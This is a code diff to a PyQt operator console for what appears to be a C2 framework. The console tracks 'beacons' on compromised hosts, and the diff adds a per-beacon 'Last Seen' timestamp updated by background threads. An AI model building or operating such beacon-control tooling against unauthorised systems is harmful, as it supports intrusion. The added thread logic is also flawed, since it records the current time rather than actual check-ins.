@@ -6,6 +6,9 @@ from colors import TextColors
 import sys, re
 import requests
 import json
+import datetime
+from threading import Thread
+from time import sleep
 
 BR, FT, FR, FG, FY, FB, FM, FC, ST, SD, SB = B.RED, F.RESET, F.RED, F.GREEN, F.YELLOW, F.BLUE, F.MAGENTA, F.CYAN, S.RESET_ALL, S.DIM, S.BRIGHT
 
@@ -74,8 +77,8 @@ class mainWidget(QtWidgets.QWidget):
         self.tableWidget.setObjectName(u"tableWidget")
         self.tableWidget.verticalHeader().setVisible(False)
         self.tableWidget.setFixedHeight(150)
-        self.tableWidget.setColumnCount(8)
-        self.tableWidget.setHorizontalHeaderLabels(['Beacon ID','External IP','Internal IP','Hostname','OS Version','Process name','PID','Architecture'])
+        self.tableWidget.setColumnCount(9)
+        self.tableWidget.setHorizontalHeaderLabels(['Beacon ID','External IP','Internal IP','Hostname','OS Version','Process name','PID','Architecture','Last Seen'])
         self.tableWidget.horizontalHeader().setSectionResizeMode(QtWidgets.QHeaderView.ResizeMode.Stretch) # Fit to window :)
         # Table color, font and position on the grid
         self.tableWidget.setStyleSheet("background: #282a36; ")
@@ -149,6 +152,15 @@ class mainWidget(QtWidgets.QWidget):
         self.echoCommand()
         self.parseCommand()
         self.clearCommandInput()
+    
+    def beacon_time(self,arg):
+        while True:
+            # Create row when beacon connects and add new row for each beacon connected
+            self.currentRowCount = arg
+            #self.tableWidget.insertRow(self.currentRowCount)
+            date_time = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S/%p")
+            self.tableWidget.setItem(self.currentRowCount, 8, QtWidgets.QTableWidgetItem(date_time))
+            sleep(1)
 
     def check_beacons(self):
         api_endpoint = "/reg"
@@ -178,6 +190,11 @@ class mainWidget(QtWidgets.QWidget):
         self.tableWidget.setItem(self.currentRowCount, 5, QtWidgets.QTableWidgetItem(proc_name))
         self.tableWidget.setItem(self.currentRowCount, 6, QtWidgets.QTableWidgetItem(pid))
         self.tableWidget.setItem(self.currentRowCount, 7, QtWidgets.QTableWidgetItem(arch))
+        self.tableWidget.setItem(self.currentRowCount, 8, QtWidgets.QTableWidgetItem("")) # Without this empty table I had a bug with date_time method creating tables once executed
+        global thread
+        thread = Thread(target=ex.mainWidget.beacon_time, args=(self.currentRowCount, ))
+        thread.daemon = True # If the main thread kills, this thread will be killed as well
+        thread.start()
 
     def getOutput(self):
         api_endpoint = "/results"
@@ -258,4 +275,5 @@ if __name__ == '__main__':
     timer.timeout.connect(lambda: ex.mainWidget.check_beacons())
     timer.timeout.connect(lambda: ex.mainWidget.getOutput())
     timer.start(5000)
+    #thread.join()
     sys.exit(app.exec())
